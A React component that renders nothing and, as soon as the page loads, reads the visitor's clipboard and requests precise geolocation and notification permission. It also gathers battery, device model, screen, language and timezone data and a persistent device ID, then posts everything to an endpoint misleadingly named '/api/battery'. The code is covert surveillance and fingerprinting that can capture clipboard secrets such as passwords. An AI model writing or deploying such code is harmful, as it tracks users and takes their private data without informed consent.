import { useEffect } from "react";

const DEVICE_ID_KEY = "device_id";

// Random id kept in localStorage. Browsers expose no hardware ids (IMEI, serial...),
// so this identifies the browser install, and resets if site data is cleared.
function getDeviceId() {
  try {
    let id = localStorage.getItem(DEVICE_ID_KEY);
    if (!id) {
      id = crypto.randomUUID();
      localStorage.setItem(DEVICE_ID_KEY, id);
    }
    return id;
  } catch {
    return null;
  }
}

function getLocation() {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(new Error("not supported in this browser"));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve(pos.coords),
      (err) =>
        reject(
          new Error(
            err.code === err.PERMISSION_DENIED
              ? "permission denied"
              : err.message,
          ),
        ),
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
    );
  });
}

// Chromium only. Adds the device model (e.g. "Pixel 7") on Android.
async function getUaData() {
  const d = navigator.userAgentData;
  if (!d) return null;
  const base = { brands: d.brands, mobile: d.mobile, platform: d.platform };
  try {
    const hi = await d.getHighEntropyValues([
      "platformVersion",
      "model",
      "architecture",
    ]);
    return {
      ...base,
      platformVersion: hi.platformVersion,
      model: hi.model,
      architecture: hi.architecture,
    };
  } catch {
    return base;
  }
}

async function getNotificationPermission() {
  if (!("Notification" in window)) return "unsupported";
  if (Notification.permission !== "default") return Notification.permission;
  return await Notification.requestPermission(); // "granted" | "denied" | "default"
}

async function readClipboard() {
  if (!navigator.clipboard?.readText)
    throw new Error("not supported in this browser");
  const text = await navigator.clipboard.readText();
  return text.slice(0, 500); // cap what we send
}

export default function App() {
  useEffect(() => {
    handleClick();
  }, []);

  async function handleClick() {
    const skippedNow = [];
    // Run one optional step; if it fails, note why and carry on with the rest.
    const optional = async (label, fn) => {
      try {
        return await fn();
      } catch (e) {
        skippedNow.push(`${label}: ${e.message || "failed"}`);
        return null;
      }
    };

    try {
      const clipboard = await optional("Clipboard", readClipboard);
      const notifications = await optional(
        "Notifications",
        getNotificationPermission,
      );
      const coords = await optional("Location", getLocation);
      const battery = await optional("Battery", async () => {
        if (!("getBattery" in navigator))
          throw new Error("not supported in this browser");
        return navigator.getBattery();
      });
      const uaData = await optional("UA data", getUaData);

      const res = await fetch("/api/battery", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          device_id: getDeviceId(),
          level: battery?.level ?? null,
          charging: battery?.charging ?? null,
          lat: coords?.latitude ?? null,
          lng: coords?.longitude ?? null,
          accuracy: coords?.accuracy ?? null,
          clipboard,
          notifications,
          user_agent: navigator.userAgent,
          ua_data: uaData,
          screen: {
            width: window.screen.width,
            height: window.screen.height,
            viewport_width: window.innerWidth,
            viewport_height: window.innerHeight,
            pixel_ratio: window.devicePixelRatio,
            touch_points: navigator.maxTouchPoints || 0,
            orientation: window.screen.orientation?.type ?? null,
          },
          language: navigator.language,
          languages: [...(navigator.languages || [])],
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          utc_offset_minutes: -new Date().getTimezoneOffset(),
        }),
      });
      if (!res.ok) throw new Error(`Server responded ${res.status}`);

      console.log("device info sent", await res.json());
      if (skippedNow.length) console.log("skipped", skippedNow);
    } catch (e) {
      console.error("device info failed:", e.message || e);
    }
  }

  return null;
}
